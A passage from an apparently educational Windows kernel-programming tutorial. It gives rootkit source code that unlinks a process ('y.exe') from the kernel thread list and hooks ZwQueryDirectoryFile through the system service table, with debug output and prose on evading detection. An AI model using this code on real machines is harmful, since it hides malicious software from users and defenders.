<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(*ptr
== 0xb9 &amp;&amp; *(ptr+5) == 0x84 &amp;&amp; *(ptr+6) == 0xc0 &amp;&amp;
*(ptr+24) == 0xb9)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gKiWaitOutListHead
= *(long *)(ptr + 25);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%x&quot;,gKiWaitOutListHead);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>start
= (LIST_ENTRY *)gKiWaitOutListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start-&gt;Flink;<span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= *((long *)((long)cur + 388));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>namePtr
= (unsigned char *)(*((long *)((long)cur + 464))) + 508;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%d
%s cur=%x Flink=%x Blink=%x&quot;,val,namePtr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( strcmp(&quot;y.exe&quot;,namePtr) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*Flink,*Blink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Flink
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Blink
= cur-&gt;Blink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Blink-&gt;Flink
= Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Check&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>start
= (LIST_ENTRY *)gKiWaitOutListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start-&gt;Flink;<span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= *((long *)((long)cur + 388));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>namePtr
= (unsigned char *)(*((long *)((long)cur + 464))) + 508;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s&quot;,namePtr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>8
System cur=8202d07c Flink=81be97fc Blink=8202adfc<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>988
y.exe cur=81be97fc Flink=8202d8fc Blink=8202d07c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>8
System cur=8202d8fc Flink=80482808 Blink=81be97fc<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
thread list as mentioned above are nothing but a circular double linked list
with the Flink pointing to the next LIST_ENTRY and Blink to the previous. We
check for a program called y.exe and when we find it, we simply take Blink to
point to the previous thread structure. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
set the Flink of this to point to Flink which is the address of the next thread
structure. This is how we remove ourselves from the thread linked list. We
redisplay all the threads again and we do not see the process y.exe. Thus If we
remove ourselves from both<span style="mso-spacerun: yes">  </span>the process
and thread list, our program does not catch us. For every method we finding of
catching the bad guy, there is another way of hiding ourselves. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
thought that if we hid ourselves from the thread lists,<span
style="mso-spacerun: yes">  </span>even windows would not give us any time but
it seems that these list are not used by the OS to decide the scheduling of
threads.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P61<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;string.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
struct <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
NextEntryOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
FileIndex;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
CreationTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
LastAccessTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
LastWriteTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
ChangeTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
EndOfFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
AllocationSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
FileAttributes;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
FileNameLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG
EaSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>CCHAR
ShortNameLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>WCHAR
ShortName[12];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>WCHAR
FileName[1];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}FILE_BOTH_DIR_INFORMATION;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
struct <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
int *ServiceTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
int *ServiceCounterTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
int NumberOfServices;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *ParamTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
sdt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
short uFileName[128];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
sdt KeServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI
NTSTATUS NTAPI ZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE
IoApcRoutine,PVOID IoApcContext,PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
NTSTATUS (*qtype)(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE IoApcRoutine,<span
style="mso-spacerun: yes">   </span>PVOID IoApcContext,<span
style="mso-spacerun: yes">     </span>PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>qtype
OldZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
NewZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE
IoApcRoutine,PVOID IoApcContext,PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
rc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc=OldZwQueryDirectoryFile(hFile,hEvent,IoApcRoutine,IoApcContext,pIoStatusBlock,FileInformationBuffer,FileInformationBufferLength,FileInfoClass,bReturnOnlyOneEntry,PathMask,bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;FileInfoClass=%d
rc=%d\n&quot;, FileInfoClass ,rc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
rc == 0 &amp;&amp; FileInfoClass == 3)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>FILE_BOTH_DIR_INFORMATION
*p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
last = 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= prev = (FILE_BOTH_DIR_INFORMATION *) FileInformationBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while(!last)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( p-&gt;NextEntryOffset == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>last
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>wcsncpy
(uFileName,p-&gt;FileName,p-&gt;FileNameLength/2);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>uFileName[p-&gt;FileNameLength/2]
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%S
Length=%d Delta=%d&quot;,uFileName,p-&gt;FileNameLength,p-&gt;
NextEntryOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (FILE_BOTH_DIR_INFORMATION *)((char *)p + (int)p-&gt;NextEntryOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(rc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
no;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
cli<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)OldZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
sti<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
*p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2 KeServiceDescriptorTable=%x&quot;,KeServiceDescriptorTable);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (char *) ZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no
= *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>OldZwQueryDirectoryFile=
(qtype)KeServiceDescriptorTable. ServiceTableBase [no];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
cli<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
